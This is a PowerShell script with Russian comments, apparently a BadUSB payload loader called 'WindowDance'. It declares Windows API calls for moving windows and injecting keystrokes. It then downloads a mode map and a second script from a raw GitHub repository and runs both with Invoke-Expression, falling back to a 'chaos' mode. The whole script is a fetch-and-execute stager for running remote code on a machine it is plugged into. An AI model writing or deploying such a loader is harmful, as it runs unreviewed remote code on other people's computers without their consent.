param ([string]$mode = "chaos")

$repo = "https://raw.githubusercontent.com/ReAndrew/BadUSB_pws/refs/heads/main"
$currentTag = "WindowDance_Instance"
$host.ui.RawUI.WindowTitle = $currentTag

# --- Блок WinApi (Общий для всех) ---
Add-Type -AssemblyName System.Windows.Forms
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtInfo);
    public struct RECT { public int Left, Top, Right, Bottom; }
}
"@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue

# Общие переменные
$SWP_FLAGS = 0x0001 -bor 0x0004 -bor 0x0010 -bor 0x4000
$workArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea

# Функция остановки
function Stop-AllDances {
    [void](Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
        $_.MainWindowTitle -eq $currentTag -and $_.Id -ne $PID 
    } | Stop-Process -Force)
}

# --- Логика Переходника ---
try {
    # 1. Скачиваем карту-переходник
    $mapData = Invoke-RestMethod -Uri "$repo/redirect.ps1"
    $map = Invoke-Expression $mapData # Превращаем текст в объект-таблицу

    # 2. Определяем, что делать
    if ($map.ContainsKey($mode)) {
        $target = $map[$mode]
    } else {
        $target = $map["chaos"] # Режим по умолчанию, если ничего не найдено
    }

    # 3. Обработка команды остановки
    if ($target -eq "kill") { Stop-AllDances; exit }
    Stop-AllDances

    # 4. Загрузка и запуск конкретного скрипта
    $scriptUrl = "$repo/$target"
    $scriptCode = Invoke-RestMethod -Uri $scriptUrl
    
    Write-Host "Starting mode: $mode (File: $target)" -ForegroundColor Cyan
    Invoke-Expression $scriptCode
} catch {
    Write-Error "Failed to load script or map. Check internet connection or URLs."
}
